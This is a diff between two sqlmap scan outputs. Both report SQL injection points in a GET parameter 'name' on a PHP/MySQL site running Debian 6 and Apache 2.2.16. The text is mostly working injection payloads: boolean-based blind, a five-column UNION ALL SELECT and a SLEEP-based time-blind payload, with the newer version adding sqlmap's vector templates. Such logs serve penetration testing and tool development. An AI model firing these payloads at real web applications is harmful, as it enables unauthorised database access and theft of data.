@@ -1,18 +1,21 @@
-sqlmap identified the following injection points with a total of 40 HTTP(s) requests:
+sqlmap identified the following injection points with a total of 9985 HTTP(s) requests:
 ---
 Place: GET
 Parameter: name
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: name=root' AND 9860=9860 AND 'CVId'='CVId
+    Payload: name=root' AND 6828=6828 AND 'YjOy'='YjOy
+    Vector: AND [INFERENCE]
 
     Type: UNION query
     Title: MySQL UNION query (NULL) - 5 columns
-    Payload: name=root' UNION ALL SELECT NULL,CONCAT(0x716a7a7171,0x77664b4c78487547546b,0x716a787671),NULL,NULL,NULL#
+    Payload: name=root' UNION ALL SELECT CONCAT(0x716b707671,0x65486e4f487070677454,0x717a6b7171),NULL,NULL,NULL,NULL#
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL#
 
     Type: AND/OR time-based blind
     Title: MySQL > 5.0.11 AND time-based blind
-    Payload: name=root' AND SLEEP(5) AND 'iqsD'='iqsD
+    Payload: name=root' AND SLEEP(5) AND 'PDJn'='PDJn
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
 ---
 web server operating system: Linux Debian 6.0 (squeeze)
 web application technology: PHP 5.3.3, Apache 2.2.16
